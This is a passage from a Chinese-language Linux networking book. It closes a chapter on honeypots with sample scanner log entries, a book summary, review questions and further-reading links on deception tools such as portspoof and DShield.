Jul 19 06:03:08 hp01 webpy[5825]: 185.53.90.19 - - [19/Jul/2021 05:34:09] "POST /goform/webLogin HTTP/1.1" 200 –
```

这个攻击者正在寻找`boa`网络服务器。这个网络服务器有一些已知的漏洞，并且被几个不同的互联网安全摄像头制造商使用（[`isc.sans.edu/diary/Pentesters+%28and+Attackers%29+Love+Internet+Connected+Security+Cameras%21/21231`](https://isc.sans.edu/diary/Pentesters+%28and+Attackers%29+Love+Internet+Connected+Security+Cameras%21/21231)）。不幸的是，`boa`网络服务器项目已经被放弃，所以不会有修复措施：

```
Jul 19 07:48:01 hp01 webpy[700]: 144.126.212.121 - - [19/Jul/2021 07:28:35] "POST /boaform/admin/formLogin HTTP/1.1" 200 –
```

这些活动报告也会被记录在您的 ISC 门户下的**我的 404 报告**中 – 让我们看一些。这个攻击者正在寻找 Netgear 路由器，很可能是在寻找最近的任何漏洞：

![图 14.17 – ISC 404 报告 – 攻击者正在寻找易受攻击的 Netgear 服务](img/B16336_14_017.jpg)

图 14.17 – ISC 404 报告 – 攻击者正在寻找易受攻击的 Netgear 服务

这个攻击者正在寻找`phpmyadmin`，这是 MySQL 数据库的常见 Web 管理门户：

![图 14.18 – ISC 404 报告 – 攻击者正在寻找易受攻击的 MySQL Web 门户](img/B16336_14_018.jpg)

图 14.18 – ISC 404 报告 – 攻击者正在寻找易受攻击的 MySQL Web 门户

请注意，第一个例子没有用户代理字符串，因此这很可能是一个自动扫描程序。第二个例子有用户代理字符串，但老实说这很可能只是伪装；它很可能也是一个自动扫描程序，寻找公共漏洞以利用。

您现在应该对主要蜜罐类型有很好的理解，为什么您可能更喜欢其中一种而不是另一种，以及如何构建每一种蜜罐。

# 总结

这就结束了我们对蜜罐的讨论，蜜罐是一种基于网络的欺骗和延迟攻击者的方法，并在攻击进行时向防御者发送警报。您应该对主要类型的蜜罐有很好的理解，以及在作为防御者时可能最好部署每种蜜罐以实现您的目标，如何构建蜜罐以及如何保护它们。我希望您对这些方法的优势有很好的把握，并计划在您的网络中至少部署其中一些！

这也是本书的最后一章，恭喜您的毅力！我们已经讨论了在数据中心以各种方式部署 Linux，并重点介绍了这些方法如何帮助网络专业人员。在每个部分中，我们都试图涵盖如何保护每项服务，或者部署该服务的安全影响 – 通常两者兼顾。我希望本书已经说明了在您自己的网络中为一些或所有这些用途使用 Linux 的优势，并且您将能够继续选择一个发行版并开始构建！

祝您网络愉快（当然要使用 Linux）！

# 问题

最后，这里是一些问题列表，供您测试对本章材料的了解。您将在*附录*的*评估*部分找到答案：

1.  `portspoof`的文档使用了一个例子，其中所有 65,535 个 TCP 端口都发送到安装的蜜罐。为什么这是一个坏主意？

1.  您可能启用哪种端口组合来伪装为 Windows **Active Directory** (**AD**)域控制器？

# 进一步阅读

要了解更多信息，请查看以下资源：

+   Portspoof 示例：[`adhdproject.github.io/#!Tools/Annoyance/Portspoof.md`](https://adhdproject.github.io/#!Tools/Annoyance/Portspoof.md)

[`www.blackhillsinfosec.com/how-to-use-portspoof-cyber-deception/`](https://www.blackhillsinfosec.com/how-to-use-portspoof-cyber-deception/)

+   LaBrea 焦油坑蜜罐：[`labrea.sourceforge.io/labrea-info.html`](https://labrea.sourceforge.io/labrea-info.html)

+   在 Microsoft Exchange 中配置 Tarpit 蜜罐：[`social.technet.microsoft.com/wiki/contents/articles/52447.exchange-2016-set-the-tarpit-levels-with-powershell.aspx`](https://social.technet.microsoft.com/wiki/contents/articles/52447.exchange-2016-set-the-tarpit-levels-with-powershell.aspx)

+   WebLabyrinth：[`github.com/mayhemiclabs/weblabyrinth`](https://github.com/mayhemiclabs/weblabyrinth)

+   Thinkst Canary 蜜罐：[`canary.tools/`](https://canary.tools/)

+   互联网风暴中心的 DShield 蜜罐项目：[`isc.sans.edu/honeypot.html`](https://isc.sans.edu/honeypot.html)

[`github.com/DShield-ISC/dshield`](https://github.com/DShield-ISC/dshield)

+   斯特兰德，J.，阿萨多里安，P.，唐纳利，B.，罗比什，E.和加尔布雷斯，B.（2017）。*攻击性对策：积极防御的艺术*。CreateSpace 独立出版。
